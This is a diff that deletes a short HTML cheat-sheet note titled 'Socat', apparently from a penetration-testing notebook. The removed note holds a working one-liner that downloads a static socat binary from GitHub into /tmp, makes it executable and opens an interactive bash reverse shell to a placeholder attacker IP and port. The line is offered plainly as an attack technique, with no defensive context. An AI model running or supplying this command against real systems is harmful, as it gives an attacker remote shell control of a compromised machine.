@@ -1,9 +1,0 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Socat</title>
-</head><body>Can download static binaries if socat isn't installed. Checkout: <a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a>&nbsp; <br/>
-<br/>
-Server reverse without socat installed:<br/>
-wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;YOUR IP&gt;:&lt;YOUR PORT&gt;</body></html>
